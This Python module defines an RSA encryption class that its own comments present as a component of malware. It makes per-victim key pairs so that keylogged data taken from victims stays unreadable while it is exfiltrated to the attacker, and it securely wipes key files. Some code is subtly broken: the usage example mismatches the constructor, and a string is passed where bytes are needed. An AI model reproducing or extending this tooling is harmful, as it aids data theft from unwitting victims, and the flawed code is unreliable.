import rsa 
import os

class Encryption:
    """
    usage:

    1. Create an instance of the Encryption class, with the name/path of the keypairs (if not set go to step 2)
    
    >>> Encryption_victim1 = Encryption("public-v1.pem", "private-v1.pem")

    2. generate key pairs if they do not exist (skip if allready generated)

    >>> Encryption_victim1.generate_keys()

    3. Load public/private key depending on what you want to encrypt/decrypt with
    
    >>> Encryption_victim1.load_public_key()
    or
    >>>Encryption_victim1.load_private_key()

    4. Encrypt or decrypt :)

    >>> decrypted_message = Encryption_victim1.decrypt(encrypted_message)
    or
    >>> encrypted_message = Encryption_victim1.encrypt("test")
    
    """

    def __init__(self, ID="", public_keyfile="", private_keyfile=""):
        self.ID = ID #to id the encryption and decryption keys, this is optional
        self.public_keyfile = public_keyfile #location/name of the public key 
        self.private_keyfile = private_keyfile #location/name of the private key
        self.public_key = ""
        self.private_key = ""

    def get_private_key(self):
        return self.private_key
        

    def generate_keys(self):
        """
        a method which generates key pairs for the victim to encrypt with public.PEM so that logged data is not
        visable while being exfiltrated
        """
        public_key, private_key = rsa.newkeys(1024)
        with open(self.public_keyfile, "wb") as public_keyfile:
            public_keyfile.write(public_key.save_pkcs1("PEM"))

        with open(self.private_keyfile, "wb") as private_keyfile:
            private_keyfile.write(private_key.save_pkcs1("PEM"))

    def load_public_key(self):
        """
        a method to load the public key (of the attacker)

        My idea is to have a diffrent public private key pair for each victim, so that if one key is comprimised
        all the other exfilled data from diffrent vitims cannot bedecrypted
        """
        with open(self.public_keyfile, "rb") as public_keyfile:
            self.public_key = rsa.PublicKey.load_pkcs1(public_keyfile.read())

    def load_private_key(self):
        """
        a method to load a private key linked to the victims public key to decrypt the exfiltrated data
        """
        with open(self.private_keyfile, "rb") as private_keyfile:
            self.private_key = rsa.PrivateKey.load_pkcs1(private_keyfile.read())
        

    def encrypt(self, data):
        """
        a method to encrypt using private or public key
        """
        
        #if the public key is set use the public key to encrypt
        if self.public_key != "":
            encrypted_blocks = []
            block_size = 117  # RSA key size in bytes
            try:
                for i in range(0, len(data), block_size):
                    #the block data is being split to be the size of the block, it will increment by each block size
                    #eg. first 0-100 then 100-200 etc...
                    block = data[i:i+block_size]
                    # Encrypt each block individually with PKCS#1 padding
                    encrypted_block = rsa.encrypt(block, self.public_key)
                    encrypted_blocks.append(encrypted_block)
                # join the encrypted blocks back into a string
                encrypted_data = b"".join(encrypted_blocks)
                return encrypted_data
            except Exception as e:
                print("Encryption error:", e)
                return None
        else:
            print("Public key not set")
            return None
        
    def decrypt(self, encrypted_data):
        """
        a method to decrypt using private key
        """
    
        if self.private_key != "":
            decrypted_blocks = []
            block_size = 128  # RSA key size in bytes
            for i in range(0, len(encrypted_data), block_size):
                encrypted_block = encrypted_data[i:i+block_size]
                # Decrypt each block individually
                decrypted_block = rsa.decrypt(encrypted_block, self.private_key)
                decrypted_blocks.append(decrypted_block)
            # Concatenate the decrypted blocks to reconstruct the original data
            decrypted_data = b"".join(decrypted_blocks)
            return decrypted_data
        else:
            print("Private key not set")
    
    def overwrite_key(self, key):
        """ 
        a function which overwrites the private key
        """
        if key.lower() == "private":

            key_file = self.private_keyfile

        elif key.lower() == "public":

            key_file = self.public_keyfile


        if os.path.exists(key_file):
            try:
                # Open the private key file for writing in binary mode
                with open(key_file, "wb") as kfile:
                    # Write random data to overwrite the content
                    kfile.write(os.urandom(os.path.getsize(key_file)))
                #remove the file
                os.remove(key_file)  
                
                #these prints would not be there in a real life situation
                print(f"Private key file '{key_file}' securely overwritten and deleted.")
            except Exception as e:
                print(f"Error securely overwriting private key file '{key_file}': {e}")
        else:
            print(f"Private key file '{key_file}' does not exist.")


class Symmetric_Encryption:
    pass